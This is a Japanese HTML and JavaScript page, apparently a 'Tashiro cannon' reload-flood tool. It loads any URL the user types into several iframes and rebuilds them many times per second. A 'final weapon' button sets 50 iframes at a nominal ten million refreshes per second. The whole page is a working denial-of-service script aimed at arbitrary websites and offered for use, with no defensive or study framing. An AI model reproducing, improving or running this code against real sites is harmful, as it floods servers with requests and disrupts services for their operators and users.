<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>超メガ粒子田代砲</title>
  <style>
    /* 基本のリセットと全体のデザイン */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Courier New', Courier, monospace;
    }

    body {
      background-color: #121212;  /* ダークテーマの背景色 */
      color: #00FF00;  /* 緑色の文字 */
      font-size: 16px;
      line-height: 1.6;
      padding: 20px;
    }

    h1 {
      font-size: 2.5em;
      text-align: center;
      color: #FF4500;  /* オレンジ色のタイトル */
      margin-bottom: 20px;
      text-shadow: 0 0 10px rgba(255, 69, 0, 0.8);
    }

    label {
      font-size: 1.2em;
      display: block;
      margin-bottom: 5px;
      color: #FFD700;  /* 黄色 */
    }

    input[type="text"], input[type="number"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 20px;
      border: 2px solid #00FF00;
      background-color: #333;
      color: #00FF00;
      font-size: 1.2em;
      border-radius: 5px;
      box-shadow: 0 0 5px rgba(0, 255, 0, 0.7);
    }

    input[type="text"]:focus, input[type="number"]:focus {
      border-color: #FF4500;  /* フォーカス時にオレンジ色 */
      outline: none;
    }

    button {
      padding: 15px 30px;
      background-color: #333;
      color: #00FF00;
      border: 2px solid #00FF00;
      font-size: 1.2em;
      cursor: pointer;
      margin-right: 15px;
      border-radius: 5px;
      transition: all 0.3s;
    }

    button:hover {
      background-color: #00FF00;
      color: #121212;
      border-color: #00FF00;
    }

    #status {
      margin-top: 20px;
      font-size: 1.5em;
      text-align: center;
      color: #FFD700;
    }

    #iframeContainer {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
      justify-content: center;
      margin-top: 30px;
    }

    iframe {
      width: 300px;
      height: 200px;
      border: 2px solid #00FF00;
      background-color: #000;
      box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
      transition: transform 0.3s ease;
    }

    iframe:hover {
      transform: scale(1.05);  /* iframeのホバーエフェクト */
    }

    @media (max-width: 768px) {
      iframe {
        width: 100%;
        height: 200px;
      }
    }
  </style>
</head>
<body>

  <h1>超メガ粒子田代砲(ブラウザが落ちる可能性あり</h1>

  <!-- URL入力 -->
  <label for="urlInput">URL:</label>
  <input type="text" id="urlInput" placeholder="https://example.com" required><br><br>

  <!-- 表示するインラインフレームの数 -->
  <label for="iframeCount">表示するインラインフレームの数:</label>
  <input type="number" id="iframeCount" value="5" min="1" required><br><br>

  <!-- 1秒間に更新する回数 -->
  <label for="updateRate">1秒間に更新する回数:</label>
  <input type="number" id="updateRate" value="3" min="1" required><br><br>

  <button onclick="startUpdatingIframes()">訪問開始</button>
  <button onclick="startFinalWeapon()">最終兵器(ブラウザが落ちる可能性あり)</button>
  <button onclick="stopUpdating()">ストップ</button>

  <p id="status"></p>

  <div id="iframeContainer"></div>

  <script>
    let iframeIntervals = [];  // インターバルのIDを格納する配列

    // インラインフレームを動的に追加する関数
    function addIframes(url, iframeCount) {
      const container = document.getElementById('iframeContainer');
      container.innerHTML = ''; // 既存のiframeをクリア

      for (let i = 0; i < iframeCount; i++) {
        const iframe = document.createElement('iframe');
        iframe.src = url;  // URLをiframeに設定
        container.appendChild(iframe);
      }
    }

    // インラインフレームの更新を開始する関数
    function startUpdatingIframes() {
      const url = document.getElementById('urlInput').value;
      const iframeCount = parseInt(document.getElementById('iframeCount').value);
      const updateRate = parseInt(document.getElementById('updateRate').value);

      if (!url) {
        alert('URLを入力してください。');
        return;
      }

      // ステータスメッセージを更新
      const statusElement = document.getElementById('status');
      statusElement.textContent = `インラインフレームを${iframeCount}個表示し、1秒間に${updateRate}回更新します。`;

      // インラインフレームを表示
      addIframes(url, iframeCount);

      // インラインフレームを指定した回数で更新する
      iframeIntervals.push(setInterval(() => {
        // iframeを削除して再追加
        addIframes(url, iframeCount);
      }, 1000 / updateRate));  // 1秒間に指定された回数で更新
    }

    // 「最終兵器」ボタンが押されたときに実行される関数
    function startFinalWeapon() {
      const url = document.getElementById('urlInput').value;

      // 最終兵器の設定：iframe数 50個、更新回数 10000000回/秒
      const iframeCount = 50;
      const updateRate = 10000000;

      if (!url) {
        alert('URLを入力してください。');
        return;
      }

      // ステータスメッセージを更新
      const statusElement = document.getElementById('status');
      statusElement.textContent = `「最終兵器」を起動しました。インラインフレームを${iframeCount}個表示し、1秒間に${updateRate}回更新します。`;

      // インラインフレームを表示
      addIframes(url, iframeCount);

      // インラインフレームを指定した回数で更新する
      iframeIntervals.push(setInterval(() => {
        // iframeを削除して再追加
        addIframes(url, iframeCount);
      }, 1000 / updateRate));  // 1秒間に指定された回数で更新
    }

    // ストップボタンが押されたときにインターバルを停止する関数
    function stopUpdating() {
      // すべてのインターバルをクリア
      iframeIntervals.forEach(interval => clearInterval(interval));
      iframeIntervals = [];  // インターバルIDのリストをクリア
      const statusElement = document.getElementById('status');
      statusElement.textContent = "更新が停止しました。";
    }

    // ページが離れたときにインターバルをクリア
    window.onbeforeunload = function() {
      iframeIntervals.forEach(interval => clearInterval(interval));
    };
  </script>

</body>
</html>
